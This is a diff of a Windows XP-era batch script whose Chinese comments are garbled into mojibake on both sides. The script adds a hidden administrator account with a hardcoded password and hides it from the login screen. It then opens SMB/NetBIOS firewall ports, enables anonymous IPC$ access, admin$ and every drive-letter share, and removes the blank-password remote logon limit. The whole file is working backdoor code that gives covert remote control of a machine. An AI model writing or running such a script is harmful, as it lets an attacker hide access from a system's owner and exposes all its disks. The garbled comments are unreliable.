@@ -1,31 +1,31 @@
-::å¼€å¯å…±äº«æ‰¹å¤„ç†,å¯¹Windows xpæœ‰ç”¨
+::¿ªÆô¹²ÏíÅú´¦Àí,¶ÔWindows xpÓĞÓÃ
 
 @echo off
 set myuser=asp_sql
 set mypwd=asp123
 
-::æ·»åŠ éšå½¢è´¦æˆ·
+::Ìí¼ÓÒşĞÎÕË»§
 net user %myuser% /delete
 net user %myuser% %mypwd% /add
 net user %myuser% %mypwd%
 net localgroup administrators %myuser% /add
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %myuser% /t reg_dword /d 00000000 /f
 
-::æ·»åŠ é˜²ç«å¢™é™åˆ¶
+::Ìí¼Ó·À»ğÇ½ÏŞÖÆ
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v 137:udP /t reg_sz /d 137:UDP:LocalSubNet:Enabled:@xpsp2res.dll,-22001 /f
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v 138:udP /t reg_sz /d 138:UDP:LocalSubNet:Enabled:@xpsp2res.dll,-22002 /f
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v 139:TCP /t reg_sz /d 139:TCP:LocalSubNet:Enabled:@xpsp2res.dll,-22004 /f
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v 445:TCP /t reg_sz /d 445:TCP:LocalSubNet:Enabled:@xpsp2res.dll,-22005 /f
 
 
-::å¼€å¯IPC$å…±äº«
+::¿ªÆôIPC$¹²Ïí
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v restrictanonymous /t reg_dword /d 00000000 /f
 
-::å¼€å¯admin$å…±äº«
+::¿ªÆôadmin$¹²Ïí
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters" /v AutoShareWks /t reg_dword /d 00000001 /f
 net share admin$
 
-::å¼€å¯c$ï¼Œd$ç­‰é»˜è®¤å…±äº«
+::¿ªÆôc$£¬d$µÈÄ¬ÈÏ¹²Ïí
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters" /v AutoShareServer /t reg_dword /d 00000001 /f
 for %%a in (c d e f g h i j k l m n) do @(
 if exist %%a: (
@@ -33,9 +33,9 @@ net share %%a$=%%a:
 )
 )
 
-::å°†â€œæœ¬åœ°å®‰å…¨è®¾ç½®-æœ¬åœ°å¸æˆ·çš„å…±äº«å’Œå®‰å…¨æ¨¡å¼â€ ä»â€œä»…æ¥å®¾â€æ”¹ä¸ºâ€œç»å…¸â€
+::½«¡°±¾µØ°²È«ÉèÖÃ-±¾µØÕÊ»§µÄ¹²ÏíºÍ°²È«Ä£Ê½¡± ´Ó¡°½öÀ´±ö¡±¸ÄÎª¡°¾­µä¡±
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v forceguest /t reg_dword /d 00000000 /f
 
-::å»é™¤ç©ºå¯†ç è¿œç¨‹ç™»å½•é™åˆ¶
+::È¥³ı¿ÕÃÜÂëÔ¶³ÌµÇÂ¼ÏŞÖÆ
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v limitblankpassworduse /t reg_dword /d 00000000 /f
 
